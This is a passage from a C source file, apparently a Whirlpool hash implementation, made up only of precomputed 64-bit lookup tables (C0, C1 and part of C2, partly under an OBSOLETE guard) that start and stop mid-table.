    LL(0xb5eeb5c15b7774b5), LL(0xaf86af112943beaf), LL(0x6ab56a77dfd41d6a), LL(0x505d50ba0da0ea50),
    LL(0x450945124c8a5745), LL(0xf3ebf3cb18fb38f3), LL(0x30c0309df060ad30), LL(0xef9bef2b74c3c4ef),
    LL(0x3ffc3fe5c37eda3f), LL(0x554955921caac755), LL(0xa2b2a2791059dba2), LL(0xea8fea0365c9e9ea),
    LL(0x6589650fecca6a65), LL(0xbad2bab9686903ba), LL(0x2fbc2f65935e4a2f), LL(0xc027c04ee79d8ec0),
    LL(0xde5fdebe81a160de), LL(0x1c701ce06c38fc1c), LL(0xfdd3fdbb2ee746fd), LL(0x4d294d52649a1f4d),
    LL(0x927292e4e0397692), LL(0x75c9758fbceafa75), LL(0x061806301e0c3606), LL(0x8a128a249809ae8a),
    LL(0xb2f2b2f940794bb2), LL(0xe6bfe66359d185e6), LL(0x0e380e70361c7e0e), LL(0x1f7c1ff8633ee71f),
    LL(0x62956237f7c45562), LL(0xd477d4eea3b53ad4), LL(0xa89aa829324d81a8), LL(0x966296c4f4315296),
    LL(0xf9c3f99b3aef62f9), LL(0xc533c566f697a3c5), LL(0x25942535b14a1025), LL(0x597959f220b2ab59),
    LL(0x842a8454ae15d084), LL(0x72d572b7a7e4c572), LL(0x39e439d5dd72ec39), LL(0x4c2d4c5a6198164c),
    LL(0x5e655eca3bbc945e), LL(0x78fd78e785f09f78), LL(0x38e038ddd870e538), LL(0x8c0a8c148605988c),
    LL(0xd163d1c6b2bf17d1), LL(0xa5aea5410b57e4a5), LL(0xe2afe2434dd9a1e2), LL(0x6199612ff8c24e61),
    LL(0xb3f6b3f1457b42b3), LL(0x21842115a5423421), LL(0x9c4a9c94d625089c), LL(0x1e781ef0663cee1e),
    LL(0x4311432252866143), LL(0xc73bc776fc93b1c7), LL(0xfcd7fcb32be54ffc), LL(0x0410042014082404),
    LL(0x515951b208a2e351), LL(0x995e99bcc72f2599), LL(0x6da96d4fc4da226d), LL(0x0d340d68391a650d),
    LL(0xfacffa8335e979fa), LL(0xdf5bdfb684a369df), LL(0x7ee57ed79bfca97e), LL(0x2490243db4481924),
    LL(0x3bec3bc5d776fe3b), LL(0xab96ab313d4b9aab), LL(0xce1fce3ed181f0ce), LL(0x1144118855229911),
    LL(0x8f068f0c8903838f), LL(0x4e254e4a6b9c044e), LL(0xb7e6b7d1517366b7), LL(0xeb8beb0b60cbe0eb),
    LL(0x3cf03cfdcc78c13c), LL(0x813e817cbf1ffd81), LL(0x946a94d4fe354094), LL(0xf7fbf7eb0cf31cf7),
    LL(0xb9deb9a1676f18b9), LL(0x134c13985f268b13), LL(0x2cb02c7d9c58512c), LL(0xd36bd3d6b8bb05d3),
    LL(0xe7bbe76b5cd38ce7), LL(0x6ea56e57cbdc396e), LL(0xc437c46ef395aac4), LL(0x030c03180f061b03),
    LL(0x5645568a13acdc56), LL(0x440d441a49885e44), LL(0x7fe17fdf9efea07f), LL(0xa99ea921374f88a9),
    LL(0x2aa82a4d8254672a), LL(0xbbd6bbb16d6b0abb), LL(0xc123c146e29f87c1), LL(0x535153a202a6f153),
    LL(0xdc57dcae8ba572dc), LL(0x0b2c0b582716530b), LL(0x9d4e9d9cd327019d), LL(0x6cad6c47c1d82b6c),
    LL(0x31c43195f562a431), LL(0x74cd7487b9e8f374), LL(0xf6fff6e309f115f6), LL(0x4605460a438c4c46),
    LL(0xac8aac092645a5ac), LL(0x891e893c970fb589), LL(0x145014a04428b414), LL(0xe1a3e15b42dfbae1),
    LL(0x165816b04e2ca616), LL(0x3ae83acdd274f73a), LL(0x69b9696fd0d20669), LL(0x092409482d124109),
    LL(0x70dd70a7ade0d770), LL(0xb6e2b6d954716fb6), LL(0xd067d0ceb7bd1ed0), LL(0xed93ed3b7ec7d6ed),
    LL(0xcc17cc2edb85e2cc), LL(0x4215422a57846842), LL(0x985a98b4c22d2c98), LL(0xa4aaa4490e55eda4),
    LL(0x28a0285d88507528), LL(0x5c6d5cda31b8865c), LL(0xf8c7f8933fed6bf8), LL(0x86228644a411c286),
};

#ifdef OBSOLETE
static const u64 C0[256] = {
    LL(0x1818281878c0d878), LL(0x23236523af0526af), LL(0xc6c657c6f97eb8f9), LL(0xe8e825e86f13fb6f),
    LL(0x87879487a14ccba1), LL(0xb8b8d5b862a91162), LL(0x0101030105080905), LL(0x4f4fd14f6e420d6e),
    LL(0x36365a36eead9bee), LL(0xa6a6f7a60459ff04), LL(0xd2d26bd2bdde0cbd), LL(0xf5f502f506fb0e06),
    LL(0x79798b7980ef9680), LL(0x6f6fb16fce5f30ce), LL(0x9191ae91effc6def), LL(0x5252f65207aaf807),
    LL(0x6060a060fd2747fd), LL(0xbcbcd9bc76893576), LL(0x9b9bb09bcdac37cd), LL(0x8e8e8f8e8c048a8c),
    LL(0xa3a3f8a31571d215), LL(0x0c0c140c3c606c3c), LL(0x7b7b8d7b8aff848a), LL(0x35355f35e1b580e1),
    LL(0x1d1d271d69e8f569), LL(0xe0e03de04753b347), LL(0xd7d764d7acf621ac), LL(0xc2c25bc2ed5e9ced),
    LL(0x2e2e722e966d4396), LL(0x4b4bdd4b7a62297a), LL(0xfefe1ffe21a35d21), LL(0x5757f9571682d516),
    LL(0x15153f1541a8bd41), LL(0x77779977b69fe8b6), LL(0x37375937eba592eb), LL(0xe5e532e5567b9e56),
    LL(0x9f9fbc9fd98c13d9), LL(0xf0f00df017d32317), LL(0x4a4ade4a7f6a207f), LL(0xdada73da959e4495),
    LL(0x5858e85825faa225), LL(0xc9c946c9ca06cfca), LL(0x29297b298d557c8d), LL(0x0a0a1e0a22505a22),
    LL(0xb1b1ceb14fe1504f), LL(0xa0a0fda01a69c91a), LL(0x6b6bbd6bda7f14da), LL(0x85859285ab5cd9ab),
    LL(0xbdbddabd73813c73), LL(0x5d5de75d34d28f34), LL(0x1010301050809050), LL(0xf4f401f403f30703),
    LL(0xcbcb40cbc016ddc0), LL(0x3e3e423ec6edd3c6), LL(0x05050f0511282d11), LL(0x6767a967e61f78e6),
    LL(0xe4e431e453739753), LL(0x27276927bb2502bb), LL(0x4141c34158327358), LL(0x8b8b808b9d2ca79d),
    LL(0xa7a7f4a70151f601), LL(0x7d7d877d94cfb294), LL(0x9595a295fbdc49fb), LL(0xd8d875d89f8e569f),
    LL(0xfbfb10fb308b7030), LL(0xeeee2fee7123cd71), LL(0x7c7c847c91c7bb91), LL(0x6666aa66e31771e3),
    LL(0xdddd7add8ea67b8e), LL(0x171739174bb8af4b), LL(0x4747c94746024546), LL(0x9e9ebf9edc841adc),
    LL(0xcaca43cac51ed4c5), LL(0x2d2d772d99755899), LL(0xbfbfdcbf79912e79), LL(0x070709071b383f1b),
    LL(0xadadeaad2301ac23), LL(0x5a5aee5a2feab02f), LL(0x83839883b56cefb5), LL(0x33335533ff85b6ff),
    LL(0x6363a563f23f5cf2), LL(0x020206020a10120a), LL(0xaaaae3aa38399338), LL(0x71719371a8afdea8),
    LL(0xc8c845c8cf0ec6cf), LL(0x19192b197dc8d17d), LL(0x4949db4970723b70), LL(0xd9d976d99a865f9a),
    LL(0xf2f20bf21dc3311d), LL(0xe3e338e3484ba848), LL(0x5b5bed5b2ae2b92a), LL(0x888885889234bc92),
    LL(0x9a9ab39ac8a43ec8), LL(0x26266a26be2d0bbe), LL(0x32325632fa8dbffa), LL(0xb0b0cdb04ae9594a),
    LL(0xe9e926e96a1bf26a), LL(0x0f0f110f33787733), LL(0xd5d562d5a6e633a6), LL(0x80809d80ba74f4ba),
    LL(0xbebedfbe7c99277c), LL(0xcdcd4acdde26ebde), LL(0x34345c34e4bd89e4), LL(0x4848d848757a3275),
    LL(0xffff1cff24ab5424), LL(0x7a7a8e7a8ff78d8f), LL(0x9090ad90eaf464ea), LL(0x5f5fe15f3ec29d3e),
    LL(0x20206020a01d3da0), LL(0x6868b868d5670fd5), LL(0x1a1a2e1a72d0ca72), LL(0xaeaeefae2c19b72c),
    LL(0xb4b4c1b45ec97d5e), LL(0x5454fc54199ace19), LL(0x9393a893e5ec7fe5), LL(0x22226622aa0d2faa),
    LL(0x6464ac64e90763e9), LL(0xf1f10ef112db2a12), LL(0x73739573a2bfcca2), LL(0x121236125a90825a),
    LL(0x4040c0405d3a7a5d), LL(0x0808180828404828), LL(0xc3c358c3e85695e8), LL(0xecec29ec7b33df7b),
    LL(0xdbdb70db90964d90), LL(0xa1a1fea11f61c01f), LL(0x8d8d8a8d831c9183), LL(0x3d3d473dc9f5c8c9),
    LL(0x9797a497f1cc5bf1), LL(0x0000000000000000), LL(0xcfcf4ccfd436f9d4), LL(0x2b2b7d2b87456e87),
    LL(0x76769a76b397e1b3), LL(0x82829b82b064e6b0), LL(0xd6d667d6a9fe28a9), LL(0x1b1b2d1b77d8c377),
    LL(0xb5b5c2b55bc1745b), LL(0xafafecaf2911be29), LL(0x6a6abe6adf771ddf), LL(0x5050f0500dbaea0d),
    LL(0x4545cf454c12574c), LL(0xf3f308f318cb3818), LL(0x30305030f09dadf0), LL(0xefef2cef742bc474),
    LL(0x3f3f413fc3e5dac3), LL(0x5555ff551c92c71c), LL(0xa2a2fba21079db10), LL(0xeaea23ea6503e965),
    LL(0x6565af65ec0f6aec), LL(0xbabad3ba68b90368), LL(0x2f2f712f93654a93), LL(0xc0c05dc0e74e8ee7),
    LL(0xdede7fde81be6081), LL(0x1c1c241c6ce0fc6c), LL(0xfdfd1afd2ebb462e), LL(0x4d4dd74d64521f64),
    LL(0x9292ab92e0e476e0), LL(0x75759f75bc8ffabc), LL(0x06060a061e30361e), LL(0x8a8a838a9824ae98),
    LL(0xb2b2cbb240f94b40), LL(0xe6e637e659638559), LL(0x0e0e120e36707e36), LL(0x1f1f211f63f8e763),
    LL(0x6262a662f73755f7), LL(0xd4d461d4a3ee3aa3), LL(0xa8a8e5a832298132), LL(0x9696a796f4c452f4),
    LL(0xf9f916f93a9b623a), LL(0xc5c552c5f666a3f6), LL(0x25256f25b13510b1), LL(0x5959eb5920f2ab20),
    LL(0x84849184ae54d0ae), LL(0x72729672a7b7c5a7), LL(0x39394b39ddd5ecdd), LL(0x4c4cd44c615a1661),
    LL(0x5e5ee25e3bca943b), LL(0x7878887885e79f85), LL(0x38384838d8dde5d8), LL(0x8c8c898c86149886),
    LL(0xd1d16ed1b2c617b2), LL(0xa5a5f2a50b41e40b), LL(0xe2e23be24d43a14d), LL(0x6161a361f82f4ef8),
    LL(0xb3b3c8b345f14245), LL(0x21216321a51534a5), LL(0x9c9cb99cd69408d6), LL(0x1e1e221e66f0ee66),
    LL(0x4343c54352226152), LL(0xc7c754c7fc76b1fc), LL(0xfcfc19fc2bb34f2b), LL(0x04040c0414202414),
    LL(0x5151f35108b2e308), LL(0x9999b699c7bc25c7), LL(0x6d6db76dc44f22c4), LL(0x0d0d170d39686539),
    LL(0xfafa13fa35837935), LL(0xdfdf7cdf84b66984), LL(0x7e7e827e9bd7a99b), LL(0x24246c24b43d19b4),
    LL(0x3b3b4d3bd7c5fed7), LL(0xababe0ab3d319a3d), LL(0xcece4fced13ef0d1), LL(0x1111331155889955),
    LL(0x8f8f8c8f890c8389), LL(0x4e4ed24e6b4a046b), LL(0xb7b7c4b751d16651), LL(0xebeb20eb600be060),
    LL(0x3c3c443cccfdc1cc), LL(0x81819e81bf7cfdbf), LL(0x9494a194fed440fe), LL(0xf7f704f70ceb1c0c),
    LL(0xb9b9d6b967a11867), LL(0x131335135f988b5f), LL(0x2c2c742c9c7d519c), LL(0xd3d368d3b8d605b8),
    LL(0xe7e734e75c6b8c5c), LL(0x6e6eb26ecb5739cb), LL(0xc4c451c4f36eaaf3), LL(0x030305030f181b0f),
    LL(0x5656fa56138adc13), LL(0x4444cc44491a5e49), LL(0x7f7f817f9edfa09e), LL(0xa9a9e6a937218837),
    LL(0x2a2a7e2a824d6782), LL(0xbbbbd0bb6db10a6d), LL(0xc1c15ec1e24687e2), LL(0x5353f55302a2f102),
    LL(0xdcdc79dc8bae728b), LL(0x0b0b1d0b27585327), LL(0x9d9dba9dd39c01d3), LL(0x6c6cb46cc1472bc1),
    LL(0x31315331f595a4f5), LL(0x74749c74b987f3b9), LL(0xf6f607f609e31509), LL(0x4646ca46430a4c43),
    LL(0xacace9ac2609a526), LL(0x89898689973cb597), LL(0x14143c1444a0b444), LL(0xe1e13ee1425bba42),
    LL(0x16163a164eb0a64e), LL(0x3a3a4e3ad2cdf7d2), LL(0x6969bb69d06f06d0), LL(0x09091b092d48412d),
    LL(0x70709070ada7d7ad), LL(0xb6b6c7b654d96f54), LL(0xd0d06dd0b7ce1eb7), LL(0xeded2aed7e3bd67e),
    LL(0xcccc49ccdb2ee2db), LL(0x4242c642572a6857), LL(0x9898b598c2b42cc2), LL(0xa4a4f1a40e49ed0e),
    LL(0x28287828885d7588), LL(0x5c5ce45c31da8631), LL(0xf8f815f83f936b3f), LL(0x86869786a444c2a4),
};

static const u64 C1[256] = {
    LL(0x781818281878c0d8), LL(0xaf23236523af0526), LL(0xf9c6c657c6f97eb8), LL(0x6fe8e825e86f13fb),
    LL(0xa187879487a14ccb), LL(0x62b8b8d5b862a911), LL(0x0501010301050809), LL(0x6e4f4fd14f6e420d),
    LL(0xee36365a36eead9b), LL(0x04a6a6f7a60459ff), LL(0xbdd2d26bd2bdde0c), LL(0x06f5f502f506fb0e),
    LL(0x8079798b7980ef96), LL(0xce6f6fb16fce5f30), LL(0xef9191ae91effc6d), LL(0x075252f65207aaf8),
    LL(0xfd6060a060fd2747), LL(0x76bcbcd9bc768935), LL(0xcd9b9bb09bcdac37), LL(0x8c8e8e8f8e8c048a),
    LL(0x15a3a3f8a31571d2), LL(0x3c0c0c140c3c606c), LL(0x8a7b7b8d7b8aff84), LL(0xe135355f35e1b580),
    LL(0x691d1d271d69e8f5), LL(0x47e0e03de04753b3), LL(0xacd7d764d7acf621), LL(0xedc2c25bc2ed5e9c),
    LL(0x962e2e722e966d43), LL(0x7a4b4bdd4b7a6229), LL(0x21fefe1ffe21a35d), LL(0x165757f9571682d5),
    LL(0x4115153f1541a8bd), LL(0xb677779977b69fe8), LL(0xeb37375937eba592), LL(0x56e5e532e5567b9e),
    LL(0xd99f9fbc9fd98c13), LL(0x17f0f00df017d323), LL(0x7f4a4ade4a7f6a20), LL(0x95dada73da959e44),
    LL(0x255858e85825faa2), LL(0xcac9c946c9ca06cf), LL(0x8d29297b298d557c), LL(0x220a0a1e0a22505a),
    LL(0x4fb1b1ceb14fe150), LL(0x1aa0a0fda01a69c9), LL(0xda6b6bbd6bda7f14), LL(0xab85859285ab5cd9),
    LL(0x73bdbddabd73813c), LL(0x345d5de75d34d28f), LL(0x5010103010508090), LL(0x03f4f401f403f307),
    LL(0xc0cbcb40cbc016dd), LL(0xc63e3e423ec6edd3), LL(0x1105050f0511282d), LL(0xe66767a967e61f78),
    LL(0x53e4e431e4537397), LL(0xbb27276927bb2502), LL(0x584141c341583273), LL(0x9d8b8b808b9d2ca7),
    LL(0x01a7a7f4a70151f6), LL(0x947d7d877d94cfb2), LL(0xfb9595a295fbdc49), LL(0x9fd8d875d89f8e56),
    LL(0x30fbfb10fb308b70), LL(0x71eeee2fee7123cd), LL(0x917c7c847c91c7bb), LL(0xe36666aa66e31771),
    LL(0x8edddd7add8ea67b), LL(0x4b171739174bb8af), LL(0x464747c947460245), LL(0xdc9e9ebf9edc841a),
    LL(0xc5caca43cac51ed4), LL(0x992d2d772d997558), LL(0x79bfbfdcbf79912e), LL(0x1b070709071b383f),
    LL(0x23adadeaad2301ac), LL(0x2f5a5aee5a2feab0), LL(0xb583839883b56cef), LL(0xff33335533ff85b6),
    LL(0xf26363a563f23f5c), LL(0x0a020206020a1012), LL(0x38aaaae3aa383993), LL(0xa871719371a8afde),
    LL(0xcfc8c845c8cf0ec6), LL(0x7d19192b197dc8d1), LL(0x704949db4970723b), LL(0x9ad9d976d99a865f),
    LL(0x1df2f20bf21dc331), LL(0x48e3e338e3484ba8), LL(0x2a5b5bed5b2ae2b9), LL(0x92888885889234bc),
    LL(0xc89a9ab39ac8a43e), LL(0xbe26266a26be2d0b), LL(0xfa32325632fa8dbf), LL(0x4ab0b0cdb04ae959),
    LL(0x6ae9e926e96a1bf2), LL(0x330f0f110f337877), LL(0xa6d5d562d5a6e633), LL(0xba80809d80ba74f4),
    LL(0x7cbebedfbe7c9927), LL(0xdecdcd4acdde26eb), LL(0xe434345c34e4bd89), LL(0x754848d848757a32),
    LL(0x24ffff1cff24ab54), LL(0x8f7a7a8e7a8ff78d), LL(0xea9090ad90eaf464), LL(0x3e5f5fe15f3ec29d),
    LL(0xa020206020a01d3d), LL(0xd56868b868d5670f), LL(0x721a1a2e1a72d0ca), LL(0x2caeaeefae2c19b7),
    LL(0x5eb4b4c1b45ec97d), LL(0x195454fc54199ace), LL(0xe59393a893e5ec7f), LL(0xaa22226622aa0d2f),
    LL(0xe96464ac64e90763), LL(0x12f1f10ef112db2a), LL(0xa273739573a2bfcc), LL(0x5a121236125a9082),
    LL(0x5d4040c0405d3a7a), LL(0x2808081808284048), LL(0xe8c3c358c3e85695), LL(0x7becec29ec7b33df),
    LL(0x90dbdb70db90964d), LL(0x1fa1a1fea11f61c0), LL(0x838d8d8a8d831c91), LL(0xc93d3d473dc9f5c8),
    LL(0xf19797a497f1cc5b), LL(0x0000000000000000), LL(0xd4cfcf4ccfd436f9), LL(0x872b2b7d2b87456e),
    LL(0xb376769a76b397e1), LL(0xb082829b82b064e6), LL(0xa9d6d667d6a9fe28), LL(0x771b1b2d1b77d8c3),
    LL(0x5bb5b5c2b55bc174), LL(0x29afafecaf2911be), LL(0xdf6a6abe6adf771d), LL(0x0d5050f0500dbaea),
    LL(0x4c4545cf454c1257), LL(0x18f3f308f318cb38), LL(0xf030305030f09dad), LL(0x74efef2cef742bc4),
    LL(0xc33f3f413fc3e5da), LL(0x1c5555ff551c92c7), LL(0x10a2a2fba21079db), LL(0x65eaea23ea6503e9),
    LL(0xec6565af65ec0f6a), LL(0x68babad3ba68b903), LL(0x932f2f712f93654a), LL(0xe7c0c05dc0e74e8e),
    LL(0x81dede7fde81be60), LL(0x6c1c1c241c6ce0fc), LL(0x2efdfd1afd2ebb46), LL(0x644d4dd74d64521f),
    LL(0xe09292ab92e0e476), LL(0xbc75759f75bc8ffa), LL(0x1e06060a061e3036), LL(0x988a8a838a9824ae),
    LL(0x40b2b2cbb240f94b), LL(0x59e6e637e6596385), LL(0x360e0e120e36707e), LL(0x631f1f211f63f8e7),
    LL(0xf76262a662f73755), LL(0xa3d4d461d4a3ee3a), LL(0x32a8a8e5a8322981), LL(0xf49696a796f4c452),
    LL(0x3af9f916f93a9b62), LL(0xf6c5c552c5f666a3), LL(0xb125256f25b13510), LL(0x205959eb5920f2ab),
    LL(0xae84849184ae54d0), LL(0xa772729672a7b7c5), LL(0xdd39394b39ddd5ec), LL(0x614c4cd44c615a16),
    LL(0x3b5e5ee25e3bca94), LL(0x857878887885e79f), LL(0xd838384838d8dde5), LL(0x868c8c898c861498),
    LL(0xb2d1d16ed1b2c617), LL(0x0ba5a5f2a50b41e4), LL(0x4de2e23be24d43a1), LL(0xf86161a361f82f4e),
    LL(0x45b3b3c8b345f142), LL(0xa521216321a51534), LL(0xd69c9cb99cd69408), LL(0x661e1e221e66f0ee),
    LL(0x524343c543522261), LL(0xfcc7c754c7fc76b1), LL(0x2bfcfc19fc2bb34f), LL(0x1404040c04142024),
    LL(0x085151f35108b2e3), LL(0xc79999b699c7bc25), LL(0xc46d6db76dc44f22), LL(0x390d0d170d396865),
    LL(0x35fafa13fa358379), LL(0x84dfdf7cdf84b669), LL(0x9b7e7e827e9bd7a9), LL(0xb424246c24b43d19),
    LL(0xd73b3b4d3bd7c5fe), LL(0x3dababe0ab3d319a), LL(0xd1cece4fced13ef0), LL(0x5511113311558899),
    LL(0x898f8f8c8f890c83), LL(0x6b4e4ed24e6b4a04), LL(0x51b7b7c4b751d166), LL(0x60ebeb20eb600be0),
    LL(0xcc3c3c443cccfdc1), LL(0xbf81819e81bf7cfd), LL(0xfe9494a194fed440), LL(0x0cf7f704f70ceb1c),
    LL(0x67b9b9d6b967a118), LL(0x5f131335135f988b), LL(0x9c2c2c742c9c7d51), LL(0xb8d3d368d3b8d605),
    LL(0x5ce7e734e75c6b8c), LL(0xcb6e6eb26ecb5739), LL(0xf3c4c451c4f36eaa), LL(0x0f030305030f181b),
    LL(0x135656fa56138adc), LL(0x494444cc44491a5e), LL(0x9e7f7f817f9edfa0), LL(0x37a9a9e6a9372188),
    LL(0x822a2a7e2a824d67), LL(0x6dbbbbd0bb6db10a), LL(0xe2c1c15ec1e24687), LL(0x025353f55302a2f1),
    LL(0x8bdcdc79dc8bae72), LL(0x270b0b1d0b275853), LL(0xd39d9dba9dd39c01), LL(0xc16c6cb46cc1472b),
    LL(0xf531315331f595a4), LL(0xb974749c74b987f3), LL(0x09f6f607f609e315), LL(0x434646ca46430a4c),
    LL(0x26acace9ac2609a5), LL(0x9789898689973cb5), LL(0x4414143c1444a0b4), LL(0x42e1e13ee1425bba),
    LL(0x4e16163a164eb0a6), LL(0xd23a3a4e3ad2cdf7), LL(0xd06969bb69d06f06), LL(0x2d09091b092d4841),
    LL(0xad70709070ada7d7), LL(0x54b6b6c7b654d96f), LL(0xb7d0d06dd0b7ce1e), LL(0x7eeded2aed7e3bd6),
    LL(0xdbcccc49ccdb2ee2), LL(0x574242c642572a68), LL(0xc29898b598c2b42c), LL(0x0ea4a4f1a40e49ed),
    LL(0x8828287828885d75), LL(0x315c5ce45c31da86), LL(0x3ff8f815f83f936b), LL(0xa486869786a444c2),
};

static const u64 C2[256] = {
    LL(0xd8781818281878c0), LL(0x26af23236523af05), LL(0xb8f9c6c657c6f97e), LL(0xfb6fe8e825e86f13),
    LL(0xcba187879487a14c), LL(0x1162b8b8d5b862a9), LL(0x0905010103010508), LL(0x0d6e4f4fd14f6e42),
    LL(0x9bee36365a36eead), LL(0xff04a6a6f7a60459), LL(0x0cbdd2d26bd2bdde), LL(0x0e06f5f502f506fb),
    LL(0x968079798b7980ef), LL(0x30ce6f6fb16fce5f), LL(0x6def9191ae91effc), LL(0xf8075252f65207aa),
    LL(0x47fd6060a060fd27), LL(0x3576bcbcd9bc7689), LL(0x37cd9b9bb09bcdac), LL(0x8a8c8e8e8f8e8c04),
    LL(0xd215a3a3f8a31571), LL(0x6c3c0c0c140c3c60), LL(0x848a7b7b8d7b8aff), LL(0x80e135355f35e1b5),
    LL(0xf5691d1d271d69e8), LL(0xb347e0e03de04753), LL(0x21acd7d764d7acf6), LL(0x9cedc2c25bc2ed5e),
    LL(0x43962e2e722e966d), LL(0x297a4b4bdd4b7a62), LL(0x5d21fefe1ffe21a3), LL(0xd5165757f9571682),
    LL(0xbd4115153f1541a8), LL(0xe8b677779977b69f), LL(0x92eb37375937eba5), LL(0x9e56e5e532e5567b),
    LL(0x13d99f9fbc9fd98c), LL(0x2317f0f00df017d3), LL(0x207f4a4ade4a7f6a), LL(0x4495dada73da959e),
    LL(0xa2255858e85825fa), LL(0xcfcac9c946c9ca06), LL(0x7c8d29297b298d55), LL(0x5a220a0a1e0a2250),
    LL(0x504fb1b1ceb14fe1), LL(0xc91aa0a0fda01a69), LL(0x14da6b6bbd6bda7f), LL(0xd9ab85859285ab5c),
    LL(0x3c73bdbddabd7381), LL(0x8f345d5de75d34d2), LL(0x9050101030105080), LL(0x0703f4f401f403f3),
    LL(0xddc0cbcb40cbc016), LL(0xd3c63e3e423ec6ed), LL(0x2d1105050f051128), LL(0x78e66767a967e61f),
    LL(0x9753e4e431e45373), LL(0x02bb27276927bb25), LL(0x73584141c3415832), LL(0xa79d8b8b808b9d2c),
    LL(0xf601a7a7f4a70151), LL(0xb2947d7d877d94cf), LL(0x49fb9595a295fbdc), LL(0x569fd8d875d89f8e),
    LL(0x7030fbfb10fb308b), LL(0xcd71eeee2fee7123), LL(0xbb917c7c847c91c7), LL(0x71e36666aa66e317),
    LL(0x7b8edddd7add8ea6), LL(0xaf4b171739174bb8), LL(0x45464747c9474602), LL(0x1adc9e9ebf9edc84),
    LL(0xd4c5caca43cac51e), LL(0x58992d2d772d9975), LL(0x2e79bfbfdcbf7991), LL(0x3f1b070709071b38),
    LL(0xac23adadeaad2301), LL(0xb02f5a5aee5a2fea), LL(0xefb583839883b56c), LL(0xb6ff33335533ff85),
    LL(0x5cf26363a563f23f), LL(0x120a020206020a10), LL(0x9338aaaae3aa3839), LL(0xdea871719371a8af),
    LL(0xc6cfc8c845c8cf0e), LL(0xd17d19192b197dc8), LL(0x3b704949db497072), LL(0x5f9ad9d976d99a86),
    LL(0x311df2f20bf21dc3), LL(0xa848e3e338e3484b), LL(0xb92a5b5bed5b2ae2), LL(0xbc92888885889234),
    LL(0x3ec89a9ab39ac8a4), LL(0x0bbe26266a26be2d), LL(0xbffa32325632fa8d), LL(0x594ab0b0cdb04ae9),
    LL(0xf26ae9e926e96a1b), LL(0x77330f0f110f3378), LL(0x33a6d5d562d5a6e6), LL(0xf4ba80809d80ba74),
    LL(0x277cbebedfbe7c99), LL(0xebdecdcd4acdde26), LL(0x89e434345c34e4bd), LL(0x32754848d848757a),
    LL(0x5424ffff1cff24ab), LL(0x8d8f7a7a8e7a8ff7), LL(0x64ea9090ad90eaf4), LL(0x9d3e5f5fe15f3ec2),
    LL(0x3da020206020a01d), LL(0x0fd56868b868d567), LL(0xca721a1a2e1a72d0), LL(0xb72caeaeefae2c19),
    LL(0x7d5eb4b4c1b45ec9), LL(0xce195454fc54199a), LL(0x7fe59393a893e5ec), LL(0x2faa22226622aa0d),
    LL(0x63e96464ac64e907), LL(0x2a12f1f10ef112db), LL(0xcca273739573a2bf), LL(0x825a121236125a90),
    LL(0x7a5d4040c0405d3a), LL(0x4828080818082840), LL(0x95e8c3c358c3e856), LL(0xdf7becec29ec7b33),
    LL(0x4d90dbdb70db9096), LL(0xc01fa1a1fea11f61), LL(0x91838d8d8a8d831c), LL(0xc8c93d3d473dc9f5),
    LL(0x5bf19797a497f1cc), LL(0x0000000000000000), LL(0xf9d4cfcf4ccfd436), LL(0x6e872b2b7d2b8745),
    LL(0xe1b376769a76b397), LL(0xe6b082829b82b064), LL(0x28a9d6d667d6a9fe), LL(0xc3771b1b2d1b77d8),
    LL(0x745bb5b5c2b55bc1), LL(0xbe29afafecaf2911), LL(0x1ddf6a6abe6adf77), LL(0xea0d5050f0500dba),
    LL(0x574c4545cf454c12), LL(0x3818f3f308f318cb), LL(0xadf030305030f09d), LL(0xc474efef2cef742b),
    LL(0xdac33f3f413fc3e5), LL(0xc71c5555ff551c92), LL(0xdb10a2a2fba21079), LL(0xe965eaea23ea6503),
    LL(0x6aec6565af65ec0f), LL(0x0368babad3ba68b9), LL(0x4a932f2f712f9365), LL(0x8ee7c0c05dc0e74e),
    LL(0x6081dede7fde81be), LL(0xfc6c1c1c241c6ce0), LL(0x462efdfd1afd2ebb), LL(0x1f644d4dd74d6452),
    LL(0x76e09292ab92e0e4), LL(0xfabc75759f75bc8f), LL(0x361e06060a061e30), LL(0xae988a8a838a9824),
    LL(0x4b40b2b2cbb240f9), LL(0x8559e6e637e65963), LL(0x7e360e0e120e3670), LL(0xe7631f1f211f63f8),
    LL(0x55f76262a662f737), LL(0x3aa3d4d461d4a3ee), LL(0x8132a8a8e5a83229), LL(0x52f49696a796f4c4),
    LL(0x623af9f916f93a9b), LL(0xa3f6c5c552c5f666), LL(0x10b125256f25b135), LL(0xab205959eb5920f2),
    LL(0xd0ae84849184ae54), LL(0xc5a772729672a7b7), LL(0xecdd39394b39ddd5), LL(0x16614c4cd44c615a),
    LL(0x943b5e5ee25e3bca), LL(0x9f857878887885e7), LL(0xe5d838384838d8dd), LL(0x98868c8c898c8614),
    LL(0x17b2d1d16ed1b2c6), LL(0xe40ba5a5f2a50b41), LL(0xa14de2e23be24d43), LL(0x4ef86161a361f82f),
    LL(0x4245b3b3c8b345f1), LL(0x34a521216321a515), LL(0x08d69c9cb99cd694), LL(0xee661e1e221e66f0),
    LL(0x61524343c5435222), LL(0xb1fcc7c754c7fc76), LL(0x4f2bfcfc19fc2bb3), LL(0x241404040c041420),
    LL(0xe3085151f35108b2), LL(0x25c79999b699c7bc), LL(0x22c46d6db76dc44f), LL(0x65390d0d170d3968),
    LL(0x7935fafa13fa3583), LL(0x6984dfdf7cdf84b6), LL(0xa99b7e7e827e9bd7), LL(0x19b424246c24b43d),
    LL(0xfed73b3b4d3bd7c5), LL(0x9a3dababe0ab3d31), LL(0xf0d1cece4fced13e), LL(0x9955111133115588),
    LL(0x83898f8f8c8f890c), LL(0x046b4e4ed24e6b4a), LL(0x6651b7b7c4b751d1), LL(0xe060ebeb20eb600b),
    LL(0xc1cc3c3c443cccfd), LL(0xfdbf81819e81bf7c), LL(0x40fe9494a194fed4), LL(0x1c0cf7f704f70ceb),
    LL(0x1867b9b9d6b967a1), LL(0x8b5f131335135f98), LL(0x519c2c2c742c9c7d), LL(0x05b8d3d368d3b8d6),
    LL(0x8c5ce7e734e75c6b), LL(0x39cb6e6eb26ecb57), LL(0xaaf3c4c451c4f36e), LL(0x1b0f030305030f18),
    LL(0xdc135656fa56138a), LL(0x5e494444cc44491a), LL(0xa09e7f7f817f9edf), LL(0x8837a9a9e6a93721),
    LL(0x67822a2a7e2a824d), LL(0x0a6dbbbbd0bb6db1), LL(0x87e2c1c15ec1e246), LL(0xf1025353f55302a2),
    LL(0x728bdcdc79dc8bae), LL(0x53270b0b1d0b2758), LL(0x01d39d9dba9dd39c), LL(0x2bc16c6cb46cc147),
    LL(0xa4f531315331f595), LL(0xf3b974749c74b987), LL(0x1509f6f607f609e3), LL(0x4c434646ca46430a),
